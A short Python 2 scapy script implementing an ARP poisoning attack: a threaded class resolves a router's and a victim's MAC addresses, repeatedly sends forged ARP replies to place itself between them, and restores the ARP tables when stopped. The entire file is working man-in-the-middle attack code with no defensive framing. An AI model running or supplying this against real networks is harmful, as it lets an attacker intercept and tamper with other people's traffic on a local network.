from logging import getLogger
from scapy.all import *
from time import sleep
import sys
import threading

exitFlag = 0

class ArpPoisoning(threading.Thread):
    def __init__(self, routerIP, victimIP):
        threading.Thread.__init__(self)

        self.routerIP = routerIP
        self.victimIP = victimIP


    def run(self):
        self.routerMAC = self.GetMAC(self.routerIP)
        print "routerMAC: ", self.routerMAC
        self.victimMAC = self.GetMAC(self.victimIP)
        print "victimMAC: ",self.victimMAC
        getLogger("scapy.runtime").setLevel(logging.ERROR)
        while not exitFlag:
            #print "exitFlag ", exitFlag
            self.poison()
            sleep(1.5)
        self.end()


    def end(self):
        print "END on: ", self.victimIP
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.victimMAC), count=3)
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.routerMAC), count=3)
        sys.exit("Arret de l'attaque...")


    def poison(self):
        print "Poison on: ", self.victimIP
        send(ARP(op=2, pdst=self.victimIP, psrc=self.routerIP, hwdst=self.victimMAC))
        send(ARP(op=2, pdst=self.routerIP, psrc=self.victimIP, hwdst=self.routerMAC))


    def GetMAC(self,ip):
        ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=5, retry=5)
        for s, r in ans:
            return r[Ether].src


